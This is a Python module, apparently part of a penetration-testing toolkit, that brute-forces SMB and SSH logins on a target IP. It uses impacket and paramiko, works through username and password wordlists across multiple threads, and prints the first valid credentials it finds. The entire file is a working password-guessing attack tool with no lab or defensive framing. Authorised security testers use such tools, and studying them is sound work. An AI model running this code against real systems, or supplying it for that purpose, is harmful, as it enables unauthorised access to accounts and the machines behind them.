import threading
import sys
from queue import Queue, Empty
from utils import color_text, Colors
from impacket.smbconnection import SMBConnection

def brute_force(ip, userlist, passlist, open_ports, threads=10):
    try:
        with open(userlist, 'r', encoding='utf-8') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(color_text(f"[-] Username wordlist not found: {userlist}", Colors.RED))
        return None, None

    try:
        with open(passlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(color_text(f"[-] Password wordlist not found: {passlist}", Colors.RED))
        return None, None

    if not usernames or not passwords:
        print(color_text("[-] Wordlists are empty.", Colors.RED))
        return None, None

    brute_ports = [p for p in open_ports if p in [445, 22]]

    if not brute_ports:
        print(color_text("[-] No brute-forceable ports found (SMB, SSH).", Colors.YELLOW))
        return None, None

    target_port = brute_ports[0]
    total = len(usernames) * len(passwords)

    print(color_text(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.", Colors.GREEN))
    print(color_text(f"[+] Total combinations: {total}", Colors.GREEN))
    print(color_text(f"[+] Using {threads} threads.", Colors.BLUE))
    print(color_text(f"[+] Brute-forcing port: {target_port}", Colors.BLUE))

    q = Queue()
    lock = threading.Lock()
    state = {"found": False, "creds": None, "attempts": 0, "stop": False}

    for username in usernames:
        for password in passwords:
            q.put((username, password))

    def update_progress():
        attempts = state["attempts"]
        percent = (attempts / total) * 100 if total else 0
        bar_length = 40
        filled = int(bar_length * attempts / total) if total else 0
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f'\r[*] Attempt {attempts}/{total} | {percent:.2f}% | [{bar}]')
        sys.stdout.flush()

    def test_login(username, password, port):
        if port == 445:
            conn = None
            try:
                conn = SMBConnection(ip, ip, timeout=5)
                conn.login(username, password)
                return True
            except Exception:
                return False
            finally:
                if conn:
                    try:
                        conn.logoff()
                        conn.close()
                    except Exception:
                        pass
        elif port == 22:
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=username, password=password,
                               timeout=5, auth_timeout=5, banner_timeout=5)
                client.close()
                return True
            except Exception:
                return False
        return False

    def worker():
        while not state["stop"]:
            try:
                username, password = q.get(timeout=1)
            except Empty:
                break

            with lock:
                state["attempts"] += 1
                update_progress()

            success = test_login(username, password, target_port)

            if success:
                with lock:
                    if not state["found"]:
                        state["found"] = True
                        state["creds"] = (username, password)
                        state["stop"] = True
                        print(color_text(
                            f"\n\n[+] SUCCESS! Valid credentials found: {username}:{password}",
                            Colors.GREEN))
                q.task_done()
                break

            q.task_done()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    state["stop"] = True
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()

    if not state["found"]:
        print(color_text("\n[-] Brute force failed to find valid credentials.", Colors.RED))
        return None, None

    return state["creds"]